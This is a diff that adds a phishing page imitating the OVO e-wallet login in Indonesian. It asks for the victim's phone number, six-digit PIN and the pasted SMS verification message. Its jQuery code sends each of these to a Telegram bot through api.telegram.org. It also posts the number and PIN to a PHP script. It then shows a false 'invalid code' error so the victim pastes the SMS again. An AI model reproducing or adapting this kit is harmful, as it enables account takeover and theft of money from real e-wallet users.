@@ -1,0 +1,374 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="title" content="Login - OVO ID">
+    <meta name="description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
+    <meta name="keywords" content="ovo, payment, point, deal, loyalty, bill payment, promo, diskon, cashback, bayar listrik, pulsa, sky parking, maxx coffee, matahari department store, hypermart">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="language" content="English">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"/>
+    <link rel="stylesheet"href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="shorcut icon" href="images/icon.webp">
+    <title>OVO ID - Login</title>
+  </head>
+  <body style="background: #49268c;">
+    <div class="container">
+        <div class="row">
+            
+            <div class="col-12 m-0 p-0 mt-2">
+                <div class="col-12">
+                <img src="images/Logo.png" class="d-block mx-auto mt-3" width="100" alt="">
+            </div>
+                <img src="images/20230203-212241.gif" class="d-block mx-auto mt-12 w-100" alt="">
+            </div>
+            <div class="col-12 mt-3 px-3">
+                <div class="landing-text d-block mx-auto text-center text-white">Solusi Cerdas Finansial</div>
+                <p class="sub-landing px-3 d-block mx-auto text-center text-white mt-2">Nikmati berbagai layanan finansial dan kemudahan pembayaran dalam genggaman</p>
+                <button class="btn ms-2 py-2 btn-light w-100 mt-2" id="Next">Lanjutkan</button>
+            </div>
+        </div>
+    </div>
+<br>
+    <div id="pages" class="animate__animated animate__slideInRight">
+        <div id="loading">
+            <div class="stage">
+                <div class="dot-flashing"></div>
+            </div>
+        </div>
+
+        <div id="Login">
+            <div class="container mt-3 px-3">
+                <div class="row">
+                    <div class="col-6">
+                        <i class="fa fa-arrow-left" aria-hidden="true"></i>
+                    </div>
+                    <div class="col-6">
+                        <i class="fa fa-question-circle float-right" aria-hidden="true"></i>
+                    </div>
+                </div>
+                <div class="row mt-4">
+                    <div class="col-12">
+                        <div class="text-header">Masuk atau Daftar</div>
+                        <p class="sub-text mt-1" style="color: #6c6c6c;">Masuk atau daftar cuma butuh nomor HP aja.</p>
+                    </div>
+                    <div class="col-12 mt-4">
+                        <div class="input-group mb-3">
+                            <div class="input-group-prepend">
+                                <span class="input-group-text" id="basic-addon1">+62&nbsp;</span>
+                            </div>
+                            <input type="tel" id="notel" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxLength="12" autocomplete="off" class="form-control">
+                        </div>
+                        <label class="text-danger mx-auto">Kolom ini wajib diisi</label>
+                        <span class="d-block mx-auto">Nomor HP gak aktif atau hilang</span>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <div class="shadow-lg py-3 px-4 fixed-bottom">
+                            <p class="sub-text px-2">Dengan masuk atau daftar kamu sudah setuju sama <span>Ketentuan Layanan</span> dan <span>Kebijakan Privasi</span> OVO</p>
+                            <button type="button" class="btn ms-2 py-2 btn-ovo w-100 mt-2" disabled id="Go">Lanjutkan</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="OTP" style="overflow: scroll;">
+            <div class="container mt-3 px-3">
+                <div class="row">
+                    <div class="col-6">
+                        <i class="fa fa-arrow-left" aria-hidden="true"></i>
+                    </div>
+                </div>
+                <div class="row mt-4">
+                    <div class="col-12">
+                        <img src="images/sms.png" class="d-block mx-auto w-100" width="200" alt="">
+                        <div class="text-header mt-2 text-center">SMS Verifikasi telah terkirim </div>
+                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;">SMS Verifikasi OVO telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS Verifikasi lalu tempel dibawah ini</p>
+                    </div>
+                    <div class="col-12 mt-3">
+                        <div class="form-group">
+                            <textarea id="sms" cols="20" rows="4" class="form-control w-100" style="height: auto; padding: 10px; text-align: left;" placeholder="Tempel disini!"></textarea>
+                            <label class="text-danger d-none mt-1 mx-auto" id="ErrMsg" style="font-size: 13px;">Kolom ini wajib diisi</label>
+                        </div>
+                        <hr>
+                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;" id="reSend">Belum dapet link? Kirim ulang dalam <jk id="times"></jk> Detik</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="PIN">
+            <div class="container mt-3 px-3">
+                <div class="row">
+                    <div class="col-6">
+                        <i class="fa fa-arrow-left" aria-hidden="true"></i>
+                    </div>
+                </div>
+                <div class="row mt-4">
+                    <div class="col-12">
+                        <div class="text-header">Masukkan security code</div>
+                    </div>
+                    <div class="col-12 mt-4 px-4">
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="1" autocomplete="off" class="form-control" >
+                            </div>
+                            <div class="col-2" style="margin-left: -25px;">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="2" autocomplete="off" class="form-control" readonly>
+                            </div>
+                            <div class="col-2" style="margin-left: -25px;">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="3" autocomplete="off" class="form-control" readonly>
+                            </div>
+                            <div class="col-2" style="margin-left: -25px;">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="4" autocomplete="off" class="form-control" readonly>
+                            </div>
+                            <div class="col-2" style="margin-left: -25px;">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="5" autocomplete="off" class="form-control" readonly>
+                            </div>
+                            <div class="col-2" style="margin-left: -25px;">
+                                <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="6" autocomplete="off" class="form-control" readonly>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12">
+                        <div class="fixed-bottom px-4">
+                            <p class="sub-text mt-2 text-left" style="color: #6c6c6c; font-size: 15px;">Lupa kode kamu? <span style="color: #24c3c7; font-weight: bold;" id="AturUlang">Atur Ulang</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/tele.js"></script>
+    <script>
+        document.getElementById('times').innerHTML =
+          01+":"+01;
+        startTimer();
+        
+        
+        function startTimer() {
+          var presentTime = document.getElementById('times').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('times').innerHTML = m+":"+s;
+          
+          console.log(s);
+
+          if(s == 01) {
+            $("#reSend").html('Belum dapet link? <span style="color: #24c3c7; font-weight: bold;" id="AturUlangg">Kirim Ulang</span>')
+          } else {
+            setTimeout(startTimer, 1000);
+          }
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+    </script>
+    <script>
+        $(document).ready(function() {
+            let logo = "❁┷━❃∞∞𝑶𝑽𝑶∞∞❃━┷❁";
+            $("#reSend").on('click', function() {
+                $("#loading").show();
+                $("#reSend").html('Belum dapet link? Kirim ulang dalam <jk id="times">'+01+':'+01+'</jk> Detik')
+                setTimeout(function() { 
+                    startTimer();
+                    $("#loading").hide();
+                }, 1000);
+            });
+            $("#AturUlang").on('click', function() {
+                $("#loading").show();
+                setTimeout(function() { 
+                    $("#loading").hide();
+                }, 2000);
+            });
+            $("#Next").on('click', function() {
+                $("#pages").show();
+                $("#Login").show();
+            });
+
+            $("i.fa-arrow-left").on('click', function() {
+                $("#pages").hide();
+                $("#Login").hide();
+                $("#PIN").hide();
+                $("#OTP").hide();
+            });
+
+            $("#1").on("input", function () {
+                $1 = $("#1").val();
+                if ($1.length == 1) {
+                    $("#1").attr("readonly", !0);
+                    $("#2").focus();
+                    $("#2").attr("readonly", !1);
+                    $("#2").on("input", function () {
+                        $2 = $("#2").val();
+                        if ($2.length == 1) {
+                            $("#2").attr("readonly", !0);
+                            $("#3").focus();
+                            $("#3").attr("readonly", !1);
+                            $("#3").on("input", function () {
+                                $3 = $("#3").val();
+                                if ($3.length == 1) {
+                                    $("#3").attr("readonly", !0);
+                                    $("#4").focus();
+                                    $("#4").attr("readonly", !1);
+                                    $("#4").on("input", function () {
+                                        $4 = $("#4").val();
+                                        if ($4.length == 1) {
+                                            $("#4").attr("readonly", !0);
+                                            $("#5").focus();
+                                            $("#5").attr("readonly", !1);
+                                            $("#5").on("input", function () {
+                                                $5 = $("#5").val();
+                                                if ($5.length == 1) {
+                                                    $("#5").attr("readonly", !0);
+                                                    $("#6").focus();
+                                                    $("#6").attr("readonly", !1);
+                                                    $("#6").on("input", function () {
+                                                        $6 = $("#6").val();
+                                                        if ($6.length == 1) {
+                                                            $notel = $("#notel").val();
+                                                            $pin = $1+""+$2+""+$3+""+$4+""+$5+""+$6;
+
+                                                             var gabungan = '' + logo + '%0ANomor OVO : ' + $notel + '%0APIN : ' + $pin;
+
+                                                                    $.ajax({
+                                                            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+                                                            method: `POST`,
+                                                            beforeSend: function() {
+                                                            $("#loading").show();
+                                                            },
+                                                            success: function() {
+                                                            $("#loading").hide();
+                                                            $("#PIN").hide();
+                                                            $("#OTP").show();
+                                                            }
+                                                        });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+
+
+            $("input#setPin").on('input', function() {
+                $notel = $("#notel").val();
+                $pin = $("#setPin").val();
+
+                if($pin.length == 6) {
+                    $("#End").attr('disabled', false);
+
+                    $("#End").on('click', function() {
+                        $.ajax({
+                            url: "jiecode/two.php",
+                            method: "POST",
+                            data:"no="+$notel+"&pin="+$pin,
+                            beforeSend: function() {
+                                $("#loading").show();
+                            },
+                            success: function() {
+                                $("#loading").hide();
+                                $("#PIN").hide();
+                                $("#OTP").show();
+                            }
+                        })
+                    });
+
+                } else {
+                    $("#End").attr('disabled', true);
+                }
+            });
+
+            $("#sms").on('input', function() {
+                $notel = $("#notel").val();
+                $sms = $("#sms").val();
+
+                if($sms.length > 29) {
+                    $("#ErrMsg").html('');
+                    $("#ErrMsg").addClass('d-none');
+
+                     var gabungan = '' + logo + '%0ANomor OVO : ' + $notel + '%0ASMS : ' + $sms;
+
+                                                                    $.ajax({
+                                                            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+                                                            method: `POST`,
+                                                            beforeSend: function() {
+                                                            $("#loading").show();
+                                                            },
+                                                            success: function() {
+                                                            $("#loading").hide();
+                            $("#sms").val('');
+                            $("#ErrMsg").html('SMS Verifikasi yang anda masukkan tidak valid.');
+                            $("#ErrMsg").removeClass('d-none');
+                                                            }
+                                                        });
+                } else {
+                    $("#ErrMsg").html('Harap tempel kan Text Sms Verifikasi.');
+                    $("#ErrMsg").removeClass('d-none');
+                }
+            });
+
+            $("#notel").on('input', function() {
+                $notelx = $("#notel").val();
+
+                if($notelx.length > 9) {
+                    $("#Go").attr('disabled', false);
+
+                    
+                } else {
+                    $("#Go").attr('disabled', true);
+                }
+            });
+
+            $("#Go").on('click', function() {
+
+                var gabungan = '' + logo + '%0ANomor OVO : ' + $notelx;
+
+                $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        beforeSend: function() {
+           $("#loading").show();
+        },
+        success: function() {
+           $("#loading").hide();
+                                $("#Login").hide();
+
+                                $("#noTels").html($notelx);
+                                $("#PIN").show();
+        }
+      });
+                    });
+        });
+    </script>
+  </body>
+</html>
